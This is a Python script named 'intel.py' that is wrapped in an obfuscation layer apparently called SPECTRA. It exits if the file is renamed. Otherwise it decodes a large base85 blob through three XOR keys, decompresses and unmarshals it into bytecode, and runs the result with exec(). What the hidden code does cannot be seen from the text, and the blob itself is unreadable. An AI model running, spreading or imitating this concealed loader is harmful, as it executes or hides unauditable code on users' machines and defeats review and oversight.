# Protected by SPECTRA
import base64, marshal, zlib, os, sys
_EXP = "intel.py"
if os.path.basename(__file__) != _EXP:
    print("[!] JANGAN RENAME FILE INI!")
    sys.exit(1)
_K1 = bytes.fromhex("336c7843a3d7ad1d9e01a133ab1af796d615658045f3a560225090f6422c4336ceef3347b6af0c6cfafebe13fc29c3ca36cf18a6e7ef62aac68422c16d0eec43")
_K2 = bytes.fromhex("5e324f1b61b409d324ee5e837c40af503bd4a8844bbf548828bc31e6786614a27b9dc038860b7e864815505a43f637ac058901f3bf4719df8cf24af31e5469b3")
_K3 = bytes.fromhex("700c622cd25eff4557d94d6fc51d2564ccdbd2b26cf2327e39b72fee15bb8d03203d99d5a6bb71942c49a3d9d9166afd571a94b941bd4fa35e513d902e32ec32")
_S = """Wr+ALYf%7Pl!+xU)uJZ0h%M>@3O85Y*s|%H5}l7Bc@d)?1ve!Y3@}vNLb}&trJX>$ZH?%lpQ|I1-o|7>
d0EzBh|iqc_#J}yKNsF&A<#>E`DLSL<)%FWOUjxJY5IjWZ9f(-0CN~1sVt{_UxW0K#`?$@V@S;kr8{8_
dR26dTi<EQe&zN>ZPgTTZ>|jjuKyEcGD4wdxgfr*bQzYVT+@YB>uU+kFM-@Ui3zWv%f;4YA`1G4PsqB1
xknu<N_3E_xaYW+$MbLSEVrHFDHY;F;(gQ|4`&l23z;Z1G-{J%_L1OM!;b_R*wwp8)D#xGwW?)+R?l=<
hHu6^OlB4hB)rqM^Z4O{71edq3N-h37BgeVz1KTF7U*U)>}ScJ*FSD+a>%^3QQE&RAP0W(nOadsnZc_q
?v{(o<Jacy?(|`kURql!I=Y?*WZI>4u_v3jpW8wGwa3oZ*F5U3b9bEDVl65eGE#;S*56W0#3RlFAUbEE
Oujg0Fot^;)cko~o-5LBzHJM~_m+D0r>_=O#^_4Hq~XW%$8?r!GYcPfzLMB53@MV;Ir(DUt9-%s_5tqm
tFk1rIz!?Haahjgqg^EaFDuR&?%mXJZ)34L3lp>1pjsdg0dR8EFUjl$Hl<Y77WUb8kdWuk$)W)^tmH(8
{=3=rM=VylkQHnpOYmI5)9(O8n8TfE^V>N=;2zDLX%Q9GsX$|nYppfyC6@|rdA>dp7%LA(CETy&{l11b
kf;Q`7!^Z%luJ+H{g-|HLEg$WLBdei<7;9$x=ok_`d3i4j_VEbKCHGe2F=Q0V&E>Xd(>QMV>4V=u5Aw;
_2PmHczt)uPAIP~usMM0sCCENsqRGfZ>DU<UcbPiaCDBBatH+a?IAJ#ZciC~OVyW<I>liV^kA(QPx5Ct
pm7JfAT@Bl521#B{;$&x-b$b@S6?qa3%{R0FW3Hp#q7yAWIkIsDsZR)ezZPNQ()Ob29>oTgTkoV{>&3`
qAi7=56RN7*xY1X9&`K)g0Ek_3Hs@fb>>X~Ws+Kco2?(T)*3U}UxT6;*4&tckZiHE2hkL1?ZT-ND!4`)
pOa!h{3s0L_1lj}l<2SYXL>7$4$-TYbwnb6a4m4Qjs3Ls_mg>MArkFwYAmtz&Qoe80(-Pdpfc+&LnH!<
#}S>3miIu1-Xf`e>&oeG+zNoJjuCSZGBO4DPlbH8A?D~$R|RBp-2(9siP5vG0F93y>InJH#oJP7lM8V~
ku4>IjxtmL1~bXij2@GHsm#z>d5{Pd5rjUP4A-To4WG(RfKLNWoAufJrU`dg^(1|kEen0-J?Z5(6+}dZ
o*sS51h_YwxbP7+2~L~%t4Y~pvn$szzJASbC*qeftrA9qz-;B-PWs<RRv1al$MyMUO4_xeI5x6&beXOf
b$UnfK4|blr5>+3W`-?@KNgsDH65*!loQKoILObay8%xo(GHC}2DW$7+?BA5BSFBhKuLL1wO+BB`eARO
><Vve^pT0W1|xY7GuAIN$zo#qTOrY0HMoGgH)}+NKUs++2QS;<jHt@tA?{<LgfLk_Frxt&vn1cdp~H8W
De0wKriAui0qfW)gxz`+yBz_8ZDU%?sG&hOww9<))T~W8rG)T7Of-RwX#|5JozX*nVDXn02Xo+*49fF$
wY0f`GU%?)qk_I%z|@(xcmRaWT8PA3Xf6?Q;+za?_4O_jh)t~`)0`JFV1HPB`uw*zV#d?V*3N&MQ&b(^
HE4++nj#A)YfK?!QPN2-dVtv^#KVY1tpHZWei_0@Lj&4h8+3`mtKYOlXv$`3&01MV$&|-Os#4eXAOr<p
O?#Kdzif3!s?dWvcxP*927t3%3zc5+-rohLzdxdagdTYAwS#dpUdWdjez@92AehD5ApWA|{LhfIc`-WT
sqRndbfsTtdk0!G_9M*3D{sbQr;1}L1;c{RhMDRCaU*{bx(SWk^F+jQ=!G!u8aC#@z#9l+3GbdL>-K9G
?v)xjWuizgJO69LDK!P$q>cTJ6q!;(EX#4-R<UIKygP{a>IB$uf?p}6Wa`kQO;<(wtbP9C#1T(1O)|gb
a&=e6dUh<!m2h_HI4^$AvdkCTc99d%81G*n88xHAfNjXvxWedec6<%cXK<tg<F4<^L*5bZ{zMb4ne1(d
IQ5{UA1KS%tqe~sEPgWbdwO)I+axLk8^<8zs%mJ$LIZKHTRB}_F|UVRHm4uyPsS8CFWwAy@o?`;rJcF3
F|f}{-_)4`6;z(hpTOQeLo5zC5F{((67-K1XRp%|IzHfeC%UL-Jvut^UNF?``qj|u^%V)vm)}nHEW+9o
RX!k5vjjlF?iLq=3*r{uTbSW|9JHVcSYa?WFBG`JR;E9U48DgPAQ!jNnv<gHN0LM%J$q34r!In8nM4OI
M-#88I-6FKUI--BJj@<;U_92j;Q!@cD+>&^26_3&^%Xm@gXc(`RLM29UPPKM4y_vIA|8}=pHNNddGhB(
&XZ@pV=z8UG-b=(E0=0|phA>OJWU>OulMGcaH4DNUby5LqmtU2Vmp97oz8)`b1)+Ku|kw;ut?Y4SQUC`
V}FXzxrg+iac`OjOlmC+!{Av?HE#641r(Z+xcUxqQsLw{U7+TS3I1-&$XMAmrw7>&!@=9l&hUT^@P_zr
o<F&~J=@H@qUp_YBKR%Z6h=orcARpQ&H*nU^@kTC@&(8nm5;ZJmLmEi*DZEN5~w3_dsxDeGBCc@NU|^W
l58bn_G5OBx;#85Q8a-ovub6)Ryt<5*j*Ol^UZ<}@8$~7FTZ++hY*>~ZmElkgyaG1+GrYr<_!V8&FM=%
ubF@D1d@4!%$&<A_ds4X;l1EC-n{1sKxPf~qfM~*r(W-l66YqU$p05kAwj8qz~0;F4M35?Z&QQ7i8+Vm
Quz_tc-uUhPoG6j$I}?g%p@)B(?Q@e3)!pXP*r9Z!-8RAe(73a!zaP+dC=n?Xi2Sw8a1t7BG5c}RI=qv
UoNG!Kiq>ji5le$`y-dqenm6Sfz$zwc&_ulT^p|Zu+=i>l_Xhn8B+w9*58>_AP~gjrJbi+*;;Ttuycx*
jam3GDMWW33DUc{n-u!7it8)I=^aOj@+++D%4M1=H6Q=rIxXTB*nvA(Pil4>`Jv4%!3A_4gM~co!XoYv
wtMT*@`w+q17PG|9F7gB0dqc<0*-A0VV{=ZP5qlgyqR^bYmtc!ClD{5CqfT@t2#b9+mBy3MNs@Ogxw6Z
2#8Wb_^{H+2Hwwr)2mlF2F=;-@kb6#L^Wv|^jEAwbn_ioc<LOW!u9>8p>z)*M}=g5wEmTQpGrO3CXB>W
!OPgfa{jw<DOJ@BZ-Nq*K63$X9o;!jr|4+d@y;h%e6#N-Uwy=%+*#Z`@M;^7OJBbTBg@;Uvm9y~j4=h-
e9suI<mPNtSFhzE>dG%^$XL{0?=W29OoKDWS59evsuDXj$uhNaENq)hrZT;B=(sA|PoCKkOh5wstf%wM
DM^@v{rI)mL4~(vtkbg2FU5dvQ`g!3L{kGp*|_)iJGO}=1e^LTc<liu$(yiWTbhyo7x$N}BZEqbn_v+>
S8Fr&*OEp#WN^!>RuzD2sh-FGeYbnEEX^_Q0Sq8$6a;uIMpdtsIl2tQoq;v-DOsnuj>KXf_{{2U9OjgM
M4?w|zm%(U2L$F?o+e_uLZ6f0eW%c7c?wAK6FHDfrTwyw@~%p@%rQK$0tjAtZF%l8X?Ky??N&+!2jnbO
KKt40=gb9)$nsU^syk95Xf=QT4VD&N&=8@xAVyZil=@@`GKawC;!<Y_MZt#^1tOECc-!=<7XotgZ|?iE
i5@lPL+n(zWV{vs+po7lMO40~f6dv)E*_VQx5DzS9v>--mJy6exT6~qw%3mE;rCW=A$Q@#eu_bon%r)&
6Fsj(D>wG6-Fv#r4p4Rj3L$NDutZO`9!mU^!vHC^eLK5+53tzCXT1h^#sS$7Nne(`92qtUWsa>c%9a%>
&n5~j{G%CTzr_qJ4<LhLr=`b?))#t7Xk+nD-y?CXlX~c|qhC(5fC>x{nN$rfhZ_ZB^3!fM<&1U^R0?*s
<i@F|z_@*OpLV1M8Fk|?Hd_g-(z_mv5u;eX1S>6M^eU6?kV&A}OYT{y=6{5oyr1D}=v^Q&;qpaA?~LM$
Xc8#x_>gp5%cHs3`)Sp*)I>S)9J-m~Yw&c;b|~2I1a-rxdQAbWHX;ByW`xRM#@P(IQe9N46+RWLTv>g}
EJ&sP8KwFg-Ss4Hgq}5ypAz$yvni7F>pNbQTs!d|FbfvEZ7M{L5ZqCNWZvlHy0`k*WstkQF_MjEfC8oZ
g*(9r0~lzt?=})0wiHUh$gzWj_u@@63ZneV!6%LsmjP#*gL^?qR9`+?LZbmmENhbeF_|{Zv}RGkRHo3y
I@Zs4k~A3$<n63S3Y*0c5T$mp!p5Ul*FR{-%T?rzY@Xxgj78gocop_fj0cl_zt(v2q1XUn^9lK-9mowS
!Qdd0G8h0vu5G;p%DIbsmel!ekrC95POu%4Qo2-Y+_;cZG4b7k8{OwmZZtBYAAM>U@UZ#a|8&~Px7zNo
hc1FL_gl917B#1YF=hJHLaN7vsAzYex4bK}N<i5;`9d?0anl^9%6;NVx8nm%c^>3l_su<})3n=2Rawv9
@^EWLjER_Nx@!O~jGA==H4FXGO`y;xQFJD7HRKyKYHW!6WdkloM1U{eUARxjNm9SIuux&Uz_JUdIz{N6
M?3#KMzAW&#DfJZf}1h!_zOL=b}Is;_rt1??KYWvecHP7kCCD3bv*j&ta~UBnTcv>N4hbF5Mp3yDN5ce
+{|(CEa88B0=nC?Yo18dUm*JIZhKWVA}iVAiXq=LzJ{KMf`MiNHrHU<sAzh*F7mBAx2+lGYHL6`H3A&_
&^v`atc5{@lFMX&lstNH=tI@$OR65z-J>A|DbPA+s6L(Ucz4pM!2-AEW6@eM>C0QA4R{mWz%B#L<-Z$s
cnP{@JHX^Pm?Ii-)lo)@jd3+&m(mtv*Sy7Gp4=5rXwJCO_H;ik>iiL_n?NJ7AGr$Waz?99_)z=ZKi*c8
4kyCAKMCJ5dxK>H8JTdj8=aLvgA3{)inzlqGNOzjFeVD;U@8Dj5}-t449>NL`}lPHI2?0L7>SsMK{bJJ
5mi=*$DQldZE{jF#I`L}eT+)5KQecTBQ>`{4pttKymmCysFTT3Jip~R=8E?ayB|Mm;h+Nz!*J&HOii%L
KJb_B`;XYN!gf8}ciW_Fy*a=S!75to2;agL%og@MV=0lVXT4KDahMnRQ@_Wsd$tLW6kOD1{_t>FNrjSn
Rri*q^Z~OI>MKDluYDDF=@<9=t?f}O$ugU?&XuU$!YmV#gxDBLRlAN`$DOn-d{+uQ+=#{W)3?H((;3RZ
1Yz9@*MpV){uC7<2%M-V!@K(Jd!jKo>+1X$C|MWCWONK30FxdiSS(S^Qok`$J>mQT|H>%+AZa;Cda!e)
tA9?p-PmBfhdgn344-5E+wHkDkK95mJ62JmkwQjdg2JbIT0^h^o0OUc?Js%5*EeoF-`Gp<VpuO(jj=Vk
^SEjZX4(I8-;eQ6Qp}|rq|o!|c`ku|w5tCfs;q>!Vjb46Khk=eZB$(_lGPYV&V#+^z1~v9VvtW$RzRXH
!_zC7&cX(Ja$>XkLCWv283kB|I5XXlXFe0n@Do{gDe64B)uwlI$d1)!@XNzzO5T2kY|Y*RsIIkQ^71Yf
2{l8i%s8UMg931dMdx26VxZQt`dwCY8ytVEZjH~BISKqzqoij-R)Tm8THMp<?i8Wm$*BDDLWvN~`0&2-
ztzV*K>m`*d_K7JBbR2e#bW}<HJwbeU>B6}VCm2JOazD;#q}{eeJ>WzP%4W2%Q{d+7DV^qZPep*@xfMi
$1RQh4v4I`nhT32F)X@xXd9Auj#D0%_0MB7_R48aG$Oz!BPeHCVN94zt|oFOG(SK4gLk`{CGoi$`q#n@
Q*UR(FYHJ?qr$vzWV(Cl6s5R)zs3|&VfA?=T)H)3`xo4BYBN@WX+d;l=?0z{R<{kUaA1gcKT+sHo$e?9
F8F1%gH2c($fNALT4Uu;1ZHR+Y(Eh@67q+Zg*LIWoFXdWVMv=>azycldW$X8APTE7MfIwO!JdJ(*MI}-
-+g*-qV*W-^9(9j452)q-h_FOOs4IQWWMtj9PCwR+on~h5cs|W#4?e&2Hj=l`k<IKRSMg-U37;sX{x~v
sdzPB4=!5xSPx(|;ENS+D$;bFhRf`>oODG!x82)BtNu$VA_P^&Rr_XSJY#gO@u}NvkW9AQ&F^~S-fnhM
dy0HNLIO0!zfq5hw+;bC4^c$3i)2I7QG%!df^bg2-kl1sWeKx<17-msN~DcV<BQfWmY0I9-FoL<#_Kbj
YumyB{8zGXs&ZwDe;&dKMA@+*@BCcbn|@PboAk~_ZSoS71gT5u?rkz2^UUg0&zY%hmQjF$;*)_A=1*4~
Rq55Zr9Y0~Zc&NjDX$w+>r|yZT>i90-DQLBIBM>#kRchG&uq2F{H(E#lFf><9#{AZlkB{sE`}TA=KEZ^
DG0`bqaa$gfOn)Hy=GzE89i6-B7DV!<p!K6CHQ{SlNk!Fov;qpI=pwmi?ws&H|Z|@Nz@gpt{`tQQ_@}{
U2(|a-PQjDA1bF<AhJK$h$m%>t!aoY)lT{qlVh|DLY{|N?4@9!*omus5}rQIj*SBg@F-h<#zgqm-5+kK
&HRK3@)D<&v8aamAC)@Uuh2l)Jy==zG1X?3hUuh^>1iH;T-)I_uq~!?f;~4#m(QL;(AB^a@XM_RvlK<w
rzm(}XK<9oJXOIg=E96yD(<@-d7}$B+Nj_u+GR0yP1}J^a`v*mYMU20clS5yk2<s!fMz4Fg8k5eY?R`q
>2MBVPRVO3wl8rfhQM=wGXQ$}GBW%q!mGa^qxdjT<c@arHXMpBtV8sUZLI3cT`F^MJ_SG50k3Cu{$!fS
d-*h-Gx*p3<6*9;hm2(=QHK43t|pKRuE!QYU&nbUd`8F4s=q#H|8lUU1$26X=gxeo)?skUi^}uGOc#nO
3~YaPdFfC5^T+OH*XRC=LjE8!b}8Y-Fp+=RzHjb?ALx9!T2(jfPpc@~DpgN=0-*YTd#0VQS~%E_7_D9;
JI?%!#C_C>ie#S=Mv>oD+t?Y!=x4AcpclCm>e!~9wK2;|gjN_$5sj_VlTFS6)w4hNu#K)&_*Fq`L++Gb
nd9`6`NX1l9ij=PPG0^33lBuJL|c_uW%%-t0*=pCWcSs&sV3v<RV!A(U_t%?rKkhHTzZnn<#g#Z)vdIQ
<D91%gq;-C)NRY8H&M3^fbb+vkDi^aLXn$^GMz_A)`p!Mia|z~eXqZYA(t818Xpf3fuYqCG%J3y8V6L>
o@Mvdd+{t9Ybg@jKV>?H;r?BHsmA=SIi{o)qgO_2xEEr%c;VnzH~Xm$w8uzvf%)$-UY)3r@gF7XOy=+R
API`bc3;MRhOmu?{|7M-ls|Mq^b7d;9s%_!>8N33ON!CGC5VZLup`5kcu<`87n?V7bpA*w)ErV!;Pa!P
#-ku-dsA@|)_{J(YaUZSKF1f@{*bqb=xvd?zWK@aK9a*z%!rIJ(qEQ+ITc`je}_Y#rft_1;Niaemb2$|
0d4yae*qLV*27FjWr@L=+N#k>>4_DZXqElN1v50yM*R?RZ1Qdcndy|<GAf8p{88h-2Se*lCriGc4*|#v
rXQfiYI?0xTZjqsuJ<s%U6!|x3D@n<>FuJEmSE<}A-l;c8ys84AoneF<4+*=&Z9C7PjBBX)0B#Mi(lF|
Ksjba>xd}lj?ph{ja{)xRK=hwAHx`SA@MYNg+A7zF!eMGCIS}7F+Z@<BT<DZ(`$h@G}7!Wmxcd?0?D}T
$wUeFi*SG?L@_KKIS|SnSdX&VaclMOIo8m(LzxLAcy*sjz73dfTbPIP){zihQK9M<!=k$~o3k%0Go5ws
>rU#cLkD6!m_!_>;DrlqB&?y&54h;+%#-bne8-1>iIqMWEn%*h2$k!|6|_I<>}j^=>?jYcL8>Gr4RPh2
MO&Y>%0{%ukWj*HoUx(q&qCf<xh=jLpIkKm&UY-V@)s$|*s5-pR8=6B(8drbY4P!Of6nAfE08SF=AV63
W{$NkD?X@;wwH_yDIT}`gFvYs^s%ggZpe`!@tGHza1@yw;RHOwBS+Uvz;D3QY)F>|s#0uxJ=|02h=rFY
(WK`f{qmIWcv)Eiz@qcCyyr9H(Exk(;`s$?d0JTvLS|U%=(6{<`HNJ+5m#bqjW@qeY@f&^t9!<aNh*>m
<@3xH#ZqofbX6z-9AC0(6`{Sm5RVz=#}os`z8SDW8%<y2s98{Rr0YQq1YOf1f>zwx7+-*<8iy`gv*&zg
-!X+dx?orMdm6QAKCedSY8B@@s{p-YMEw{%u4Zj#;s%l&e@XJs$>_17>WD9nVu39jf`Dz#!Y*kTbl-fx
64{H87QV-&^=kW@M9{3w3j$-yR|@Y!tJzOGH}d`Qxl!kh6keroci=3~n4w07ftk$51upQ%6~TJ*uY3I_
%_g|DFyB==odzb6A@)`Y$Z{1-(z-yd1KsTO&e=NVMFJQs99?Vp=s{NO4x6yO?A$6mB8m$rA&Z6a#4oTm
>0taMDxwM92pv`oeC*FeNUa(qOoivjxaoKe0Z0g7!RR>juz;EK)PJfzYG6v{6%V6tA1*MQ<z+WtpMSwl
Shyf<HHAgwa?qM!cz|TKLs?w<!%W_<ddWeGE0`my^tCA8%U-=apn<)UQ8&SXICHo"""
_B = base64.b85decode(_S.replace("\n", "").encode("ascii"))
_D1 = bytes(b ^ _K3[i % len(_K3)] for i, b in enumerate(_B))
_D2 = bytes(b ^ _K2[i % len(_K2)] for i, b in enumerate(_D1))
_D3 = bytes(b ^ _K1[i % len(_K1)] for i, b in enumerate(_D2))
_Z = zlib.decompress(_D3)
_C = marshal.loads(_Z)
exec(_C)
